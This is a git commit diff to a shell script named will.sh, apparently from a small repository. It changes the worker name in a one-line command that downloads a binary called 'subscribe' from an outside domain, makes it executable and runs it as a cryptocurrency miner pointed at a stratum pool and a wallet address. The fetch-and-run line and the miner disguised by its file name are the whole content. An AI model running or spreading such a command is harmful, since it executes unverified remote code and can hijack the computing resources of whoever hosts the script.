f37e4097d22ee64253bc11de68c4b4285d5b824c
magdamana001 <86566264+magdamana001@users.noreply.github.com>
2021-12-04 09:57:07 +0100

    Update will.sh

--- will.sh
+++ will.sh
@@ -1,1 +1,1 @@
-wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qrvagw5zqr8tcy2kw3s64h8997n4mjqptdsmvsr.will2Nlify
+wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qrvagw5zqr8tcy2kw3s64h8997n4mjqptdsmvsr.NTwill2
